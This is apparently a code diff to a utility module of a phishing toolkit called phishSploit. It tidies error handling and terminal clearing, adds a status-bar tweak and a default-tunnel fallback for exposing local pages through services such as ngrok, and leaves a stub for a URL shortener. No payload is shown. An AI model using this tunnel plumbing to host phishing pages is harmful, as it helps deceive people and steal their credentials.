@@ -1,4 +1,5 @@
 import os
+import sys
 import time
 import socket
 import requests
@@ -20,6 +21,10 @@ from .constants import (
     success,
     theme_color
 )
+
+
+def clear_terminal():
+    os.system('cls' if os.name == 'nt' else 'clear')
 
 
 def banner() -> str:
@@ -50,7 +55,7 @@ def get_IPv4() -> str:
 def kill_previous_connection():
     """A miserable attempt to kill previously
     established ngrok tunnel because the program
-    sometimes decides not to thus, creating
+    sometimes decides not to, thus, creating
     an issue the next time it's to be used
     """    
     with open(URL, mode='r') as f:
@@ -83,18 +88,19 @@ def log_error(func: Callable) -> Any:
             return func(*args, **kwargs)
         except KeyboardInterrupt:
             ngrok.disconnect(PUBLICURL)
-            os._exit()
+            sys.exit(0)
         except Exception as e:
-            os.system('clear')
+            clear_terminal()
+            print(info("An error has been occured. Don't panic!"))
+            print(info("Check your `logs` directory and report the last error at this project's repo: Check your `error_log.txt` file and report the error at this project's repo: https://github.com/hor00s/phishSploit"))
             print(warning(str(e)))
             with open(ERRORTXT, mode='a+') as f:
-                print(str(e))
                 f.write(f"{TODAY}\n")
                 f.write(f'Short: {e}\n\n')
                 f.write(f"{traceback.format_exc()}\n\n")
                 f.write('-----------------\n\n')
             ngrok.disconnect(PUBLICURL)
-            os._exit(1)
+            sys.exit(1)
     
     return inner
 
@@ -144,10 +150,7 @@ def log_new_url(url) -> None:
 
 
 # TODO: Make a url shortener function
-"""
-def shortener(url):
-    ...
-"""
+def shortener(url): ...
 
 
 @log_error
@@ -189,13 +192,16 @@ def status_bar(load_time: int) -> None:
     for _ in range(int(load_time)):
         percentage += LOAD_STEP
         block += '▋ '
-        print(info(f'% {percentage}) {block}'))
+        if percentage != 100.0:
+            print(info(f'%{percentage})  {block}'))
+        elif percentage == 100.0:
+            print(info(f'%{percentage}) {block}'))
+
         time.sleep(1)
-        os.system('clear')
 
-
+@log_error
 def push_page_options(port) -> str:
-    push_page_question = input(f"""Choose one of the following services:
+    push_page_question = input(f"""Choose one of the following services (Write the whole word):
 %s: """ %(' - '.join(PUBLIC_TUNELS + PVT_TUNNELS))).lower()
 
     host = '127.0.0.1'
@@ -207,8 +213,9 @@ def push_page_options(port) -> str:
         host = '127.0.0.1'
     elif push_page_question == 'localtunnel':
         host = '127.0.0.1'
-    os.system('clear')
+    
     if push_page_question in PUBLIC_TUNELS + PVT_TUNNELS:
         return push_page_question, host
 
+    print(info(f"Invalid selection, running default tunnel: {PVT_TUNNELS[0]}"))
     return PVT_TUNNELS[0], host
